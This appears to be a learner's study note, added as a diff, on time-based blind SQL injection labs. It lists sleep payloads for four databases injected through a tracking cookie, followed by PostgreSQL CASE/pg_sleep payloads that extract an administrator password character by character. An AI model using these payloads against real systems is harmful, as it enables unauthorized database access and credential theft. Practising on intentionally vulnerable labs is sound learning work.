@@ -1,1 +1,69 @@
+Welcome to day5 of the sql injection , yesterday got chance to solve only one lab.
+
+Today we'll start to solve more problems on blind SQL
+
+Exploiting blind SQL injection by triggering time delays
+If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response.This means the previous technique for inducing conditional errors will not work.
+In this situation, it is often possible to exploit the blind SQL injection vlunerability by triggering time delays depending on the whether and injection condition is true or false 
+
+The techniques for triggering a time delay are specific to the type of database being used.For example , on microsoft SQL server ,we can use the following to test a condition and trigger a delay depending on whether the expression is true.
+'; IF(1=2) WAITFOR DELAY '0:0:10'--   => this input does not trigger delay, because the condition 1=2 is false
+'; IF(1=1) WAITFOR DELAY '0:0:10'--   => this input do trigger delay , because the condition 1=1 is true.
+
+----------------------------------------------------------------------------------------------------------------
+Exploiting blind SQL injection by triggering time delays
+This lab contains a blind SQL injection vulnerability.
+
+END Goal: exploit the SQL injection vlunerability to cause a 10 second delay.
+
+Time delays for the all kinds of database
+oracle 
+Cookie: TrackingId=zvU2UnjUwysBxxiB'(dbms_pip.receive_message(('a'),10))--  X
+Microsoft
+Cookie: TrackingId=zvU2UnjUwysBxxiB'WAITFOR DELAY '0:0:10'--   X
+PostgreSQL 
+Cookie: TrackingId=zvU2UnjUwysBxxiB'||(select pg_sleep(10))--  worked
+MySQL
+Cookie: TrackingId=zvU2UnjUwysBxxiB'||(select sleep (10))--
+
+---------------------------------------------------------------------------------------------------------------
+Lab:Blind SQL injection with time delays and information retrieval
+The lab contains a blind SQL injection vlunerability.
+End Goal:
+Enumerate the administrator password 
+Log in as the administrator user.
+
+oracle 
+Cookie: TrackingId=zvU2UnjUwysBxxiB'(dbms_pip.receive_message(('a'),10))--  X
+Microsoft
+Cookie: TrackingId=zvU2UnjUwysBxxiB'WAITFOR DELAY '0:0:10'--   X
+PostgreSQL 
+Cookie: TrackingId=zvU2UnjUwysBxxiB'||(select pg_sleep(10))--  worked
+MySQL
+Cookie: TrackingId=zvU2UnjUwysBxxiB'||(select sleep (10))--
+
+
+Now using the postgreSQL sql need to enumerate the password and login as administrator.
+
+' || (CASE WHEN (1=1) THEN pg_sleep(10) ELSE '' END) -- works
+
+' || (select CASE WHEN (username='administrator')THEN pg_sleep(10) ELSE '' END from users) -- cofirming we have users table
+
+' || (select CASE WHEN (username='administrator' and length(password)>1)THEN pg_sleep(10) ELSE '' END from users) --  finding the length of the password
+
+TrackingId=OjSWzNLHbigoSLVe' || (select CASE WHEN (username='administrator' and substring(password,1,1)='a')THEN pg_sleep(10) ELSE '' END from users) -- used to guess the character one by one 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
